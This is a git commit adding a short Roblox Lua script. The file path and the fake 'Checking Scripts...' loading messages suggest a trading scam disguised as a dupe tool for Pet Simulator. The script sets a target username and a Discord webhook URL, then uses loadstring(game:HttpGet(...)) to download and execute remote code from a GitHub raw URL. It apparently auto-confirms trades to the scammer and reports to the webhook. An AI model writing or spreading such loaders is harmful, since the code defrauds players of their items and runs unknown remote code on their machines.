f432f4041515435b4775a63e686a84b69cf964f3
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-01 02:02:47 +0700

    .lua

---
+++ TradingScam/WithDupeScript/autoconfirmtradingOn/Main/Fixed/.lua
@@ -0,0 +1,9 @@
+Username = "mxrcuszzzzz"
+WebHook = "https://discord.com/api/webhooks/1123608659218415696/bH67e256agkSWq4eCGTe3DybbI2g_YKHuhQf-gb1lL2PsZGz4jwfBvuUyInI2WQ-244N"
+
+_G.CustomScriptName = "MoonHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
